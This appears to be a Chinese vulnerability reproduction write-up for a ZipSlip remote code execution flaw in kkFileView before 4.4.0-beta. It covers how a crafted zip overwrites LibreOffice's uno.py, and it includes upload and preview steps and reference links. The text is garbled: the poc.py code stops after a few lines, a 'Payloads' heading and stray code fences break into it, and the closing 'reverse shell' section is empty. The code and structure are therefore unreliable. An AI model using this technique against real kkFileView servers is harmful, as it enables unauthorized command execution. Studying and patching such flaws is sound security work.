# kkFileView ZipSlip 远程命令执行漏洞

## 漏洞描述
kkFileView 是使用 Spring Boot 搭建的文档在线预览解决方案，能够支持多种主流办公文档的在线预览，如 doc、docx、xls、xlsx、ppt、pptx、pdf、txt、zip、rar 等格式。此外，还可以预览图片、视频、音频等多种类型的文件。

在 kkFileView 4.4.0-beta 以前，存在一处 ZipSlip 漏洞。攻击者可以利用该漏洞，向服务器任意目录下写入文件，导致任意命令执行漏洞。

参考链接：

- https://github.com/kekingcn/kkFileView/issues/553
- https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC

## 危害等级
CRITICAL

## 参考链接
- https://github.com/kekingcn/kkFileView/issues/553
- https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC
- https://github.com/kekingcn/kkFileView/commit/421a2760d58ccaba4426b5e104938ca06cc49778

## 漏洞复现方法
目标在使用 odt 转 pdf 时会调用系统的 Libreoffice，而该进程会调用库中的 `uno.py` 文件，因此可以覆盖 `uno.py` 文件的内容实现 RCE。

首先，修改 [poc.py](https://github.com/vulhub/vulhub/blob/master/kkfileview/4.3-zipslip-rce/poc.py)：

```python
import zipfile

if __name__ == "__main__":
    try:
        binary1 = b'vulhub'

## Payloads
```
执行 `poc.py`，生成 POC 文件，`test.zip` 将被写入当前目录。
```
```
然后，使用 kkFileView 服务上传 `test.zip`：

![](images/kkFileView%20ZipSlip%20远程命令执行漏洞/image-20240419212103511.png)

点击 `test.zip` 的“预览”按钮，可以看到 zip 压缩包中的文件列表：

![](images/kkFileView%20ZipSlip%20远程命令执行漏洞/image-20240419212029664.png)

最后，上传任意一个 odt 文件，例如 [sample.odt](https://github.com/vulhub/vulhub/blob/master/kkfileview/4.3-zipslip-rce/sample.odt)，发起 Libreoffice 任务：

![](images/kkFileView%20ZipSlip%20远程命令执行漏洞/image-20240419212226172.png)

点击 `sample.odt` 的“预览”按钮，触发代码执行漏洞：

![](images/kkFileView%20ZipSlip%20远程命令执行漏洞/image-20240419212315976.png)

可见，`touch /tmp/success` 已经成功被执行：

![](images/kkFileView%20ZipSlip%20远程命令执行漏洞/image-20240419212427494.png)

反弹 shell：
```
